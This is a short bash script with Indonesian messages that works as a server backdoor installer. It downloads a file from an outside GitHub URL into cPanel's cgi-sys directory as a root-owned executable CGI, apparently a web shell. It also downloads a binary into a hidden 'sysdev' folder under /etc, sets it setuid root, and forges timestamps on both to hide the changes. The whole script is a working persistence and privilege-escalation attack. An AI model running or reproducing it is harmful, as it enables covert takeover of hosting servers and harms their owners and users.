#!/bin/bash

main="https://github.com/samsulazhr/myApp/raw/refs/heads/main/main3"
cgi="https://github.com/samsulazhr/myApp/raw/refs/heads/main/meme"

cpanelcgi="/usr/local/cpanel/cgi-sys/"

cd "$cpanelcgi"

statcgi=$(stat -c %Y "$cpanelcgi" 2>/dev/null || echo 0)

wget "$cgi" -O stemplate.cgi
chown root:wheel stemplate.cgi
chmod 755 stemplate.cgi

touch -d "@$statcgi" stemplate.cgi
touch -d "@$statcgi" "$cpanelcgi"

if [ -f "stemplate.cgi" ]; then
    echo "[+] Sukses pasang file di $cpanelcgi/stemplate.cgi"
else
    echo "[-] Gagal pasang file di $cpanelcgi"
fi

arraydir=("/etc/default" "/etc/sysconfig" "/etc/fonts")
for dir in "${arraydir[@]}"; do
    if [ -d "$dir" ]; then
        cd "$dir"
        statdir=$(stat -c %Y . 2>/dev/null || echo 0)
        mkdir -p "sysdev"
        chmod 701 "sysdev"
        wget "$main" -O "sysdev/main"
        chmod 4755 "sysdev/main"
        touch -d "@$statdir" "sysdev/main"
        touch -d "@$statdir" "sysdev"
        touch -d "@$statdir" .
        if [ -d "sysdev" ]; then
            echo "[+] Sukses pasang file di $dir/sysdev/main"
            exit 0
        else
            echo "[-] Gagal pasang file di $dir"
        fi
    else
        echo "[-] Direktori $dir tidak ditemukan, melewati..."
    fi
done